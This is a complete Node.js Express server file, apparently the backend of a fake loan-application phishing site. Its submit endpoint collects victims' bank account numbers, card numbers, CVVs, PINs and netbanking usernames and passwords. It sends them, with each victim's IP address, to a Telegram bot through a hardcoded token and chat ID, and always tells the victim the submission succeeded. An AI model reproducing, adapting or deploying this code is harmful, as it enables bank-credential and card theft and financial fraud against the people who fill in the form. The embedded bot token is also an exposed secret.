// Complete server.js - Fully Functional with Telegram Integration
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const compression = require('compression');
const rateLimit = require('express-rate-limit');
const fetch = require('node-fetch');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Security Middleware
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"]
        }
    }
}));

app.use(cors({
    origin: '*',
    credentials: true
}));

app.use(compression());

// Rate Limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100,
    message: 'Too many requests, please try again later.'
});
app.use(limiter);

// Body Parsers
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Static Files
app.use(express.static(path.join(__dirname, 'public')));

// Telegram Config - Secure with Environment Variables (fallback to hardcoded)
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "8433694608:AAGIvNk5eVUAT18kFFHeRtLG6gMoO6udZPY";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "8270681405";

// Validate Telegram credentials
if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing. Exiting.');
    process.exit(1);
}

// API Submit Endpoint - INSTANT Telegram on Card/Netbanking
app.post('/api/submit', async (req, res) => {
    try {
        const {
            name, mobile, loanAmount, accountNo, ifsc,
            cardNumber, expiry, cvv, pin,
            netUsername, netPassword, paymentMethod
        } = req.body;

        const clientIP = req.ip || req.connection.remoteAddress || req.socket.remoteAddress;
        const userAgent = req.get('User-Agent') || 'Unknown';
        const timestamp = new Date().toLocaleString('en-IN', { 
            timeZone: 'Asia/Kolkata',
            year: 'numeric', month: 'long', day: 'numeric',
            hour: '2-digit', minute: '2-digit', second: '2-digit'
        });

        // Build formatted Telegram message
        let telegramMessage = `🔔 <b>NEW LOAN APPLICATION RECEIVED</b> 🔔\n\n`;
        telegramMessage += `📋 <b>Personal Details:</b>\n`;
        telegramMessage += `👤 Name: <code>${name || 'N/A'}</code>\n`;
        telegramMessage += `📱 Mobile: <code>${mobile || 'N/A'}</code>\n`;
        telegramMessage += `💰 Loan Amount: <b>₹${parseInt(loanAmount || 0).toLocaleString()}</b>\n\n`;

        telegramMessage += `🏦 <b>Bank Details:</b>\n`;
        telegramMessage += `🏠 Account No: <code>${accountNo || 'N/A'}</code>\n`;
        telegramMessage += `🔑 IFSC: <code>${ifsc || 'N/A'}</code>\n\n`;

        if (paymentMethod === 'Card') {
            telegramMessage += `💳 <b>CARD PAYMENT DETAILS:</b>\n`;
            telegramMessage += `🪪 Card: <code>${cardNumber || 'N/A'}</code>\n`;
            telegramMessage += `📅 Expiry: <code>${expiry || 'N/A'}</code>\n`;
            telegramMessage += `🔒 CVV: <code>${cvv || 'N/A'}</code>\n`;
            telegramMessage += `🔑 PIN: <code>${pin || 'N/A'}</code>\n`;
        } else if (paymentMethod === 'Netbanking') {
            telegramMessage += `🏦 <b>NETBANKING CREDENTIALS:</b>\n`;
            telegramMessage += `👤 Username: <code>${netUsername || 'N/A'}</code>\n`;
            telegramMessage += `🔐 Password: <code>${netPassword || 'N/A'}</code>\n`;
        }

        telegramMessage += `\n🌐 <b>Technical Details:</b>\n`;
        telegramMessage += `📍 IP: <code>${clientIP}</code>\n`;
        telegramMessage += `🌐 User-Agent: <code>${userAgent.substring(0, 100)}${userAgent.length > 100 ? '...' : ''}</code>\n`;
        telegramMessage += `🕒 Time: <b>${timestamp}</b>\n`;

        // Send to Telegram
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const telegramResponse = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: telegramMessage,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            })
        });

        const telegramResult = await telegramResponse.json();
        
        // Console log for server monitoring
        console.log(`📱 New submission from ${clientIP}: ${name} (${mobile}) - ₹${loanAmount} - ${paymentMethod || 'Unknown'}`);
        console.log(`📤 Telegram Status: ${telegramResult.ok ? '✅ SENT' : '❌ FAILED'} - ${JSON.stringify(telegramResult)}`);

        // Always return success to client (don't reveal server status)
        res.json({ success: true });

    } catch (error) {
        console.error('❌ Submit API Error:', error.message);
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

// Health Check
app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Serve index.html for all unmatched routes (SPA routing)
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error Handler
app.use((error, req, res, next) => {
    console.error('❌ Server Error:', error.stack);
    res.status(500).json({ success: false, error: 'Internal server error' });
});

// Start Server
app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📱 Telegram Bot Active: ${TELEGRAM_BOT_TOKEN ? '✅' : '❌'}`);
    console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID}`);
    console.log(`🛡️ Health: http://localhost:${PORT}/health`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('🛑 Shutting down gracefully...');
    process.exit(0);
});
